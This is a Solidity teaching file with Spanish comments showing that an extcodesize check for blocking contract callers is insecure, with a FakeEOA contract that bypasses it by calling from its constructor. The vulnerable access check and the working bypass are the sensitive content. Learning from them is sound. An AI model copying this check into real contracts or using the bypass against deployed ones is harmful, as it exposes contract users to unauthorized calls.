// SPDX-License-Identifier: MIT
pragma solidity >0.7.0 <=0.9.0;

contract OnlyForEOA {    // EOA= Externally Owned accounts
    uint256 public flag;

    // Esto es a fines ilustrativos pero no es seguro hacer esto
    modifier isNotContract(address _a){
        uint256 len;
        assembly { len := extcodesize(_a) }
        require(len == 0, "Usted es un contrato");
        _;
    }

    function setFlag(uint256 i) public isNotContract(msg.sender){
        flag = i;
    }
}

/*  Así podríamos hackear el contrato anterior ya que durante el contructor
    el smart contract no tiene codigo.
*/
contract FakeEOA {
    OnlyForEOA c;

    // Aca no hay código por lo que la llamda se logr
    constructor(address _a) {
        c = OnlyForEOA(_a);
        c.setFlag(83);
    }

    // Acá no falla porque hago catch al error y lo retorno pudiendolo ver en output. igualmente no modifica el flag
    function setFlagAgainCE(uint256 i) public returns(string memory) {
        try c.setFlag(i) {
            return("Pudo ejecutarlo");
        }catch Error(string memory reason){
            return(reason);
        }
    }

    // Acá falla directamente al revertirse por ser un smart contract
    function setFlagAgain(uint256 i) public {
        c.setFlag(i);
    }
}